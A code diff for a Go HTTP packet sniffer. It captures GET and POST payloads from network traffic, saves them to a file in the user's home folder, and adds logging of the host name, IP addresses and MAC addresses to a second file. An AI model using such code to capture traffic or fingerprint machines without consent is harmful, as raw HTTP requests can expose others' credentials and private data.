@@ -7,6 +7,7 @@ import (
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 	"httpsniffer/file"
+	"httpsniffer/hardware"
 	"log"
 	"os"
 	"strings"
@@ -80,11 +81,12 @@ func snifferHttp(){
 				log.Println("Unusable packet")
 				continue
 			}
+
 			tcp := packet.TransportLayer().(*layers.TCP)
 			payload := string(tcp.BaseLayer.Payload)
 			if strings.Contains(payload, "GET") || strings.Contains(payload, "POST") {
 				log.Printf("payload:%v\n", payload)
-				homePath := os.Getenv("HOMEPATH")
+				homePath := os.Getenv("HOMEDRIVE")+os.Getenv("HOMEPATH")
 				file.WriteWithOs(homePath+"/1.txt", payload)
 			}
 
@@ -93,7 +95,16 @@ func snifferHttp(){
 }
 
 func main(){
+	homePath := os.Getenv("HOMEDRIVE")+os.Getenv("HOMEPATH")
 
-	//snifferHttp()
+	host := hardware.GetComName()
+	file.WriteWithOs(homePath+"/2.txt", host+"\r\n")
+
+	ips := hardware.GetIPs()
+	file.WriteWithOs(homePath+"/2.txt", "ips:"+ips+"\r\n")
+
+	macs := hardware.GetMacAddrs()
+	file.WriteWithOs(homePath+"/2.txt", "ips:"+macs+"\r\n")
+	snifferHttp()
 }
 
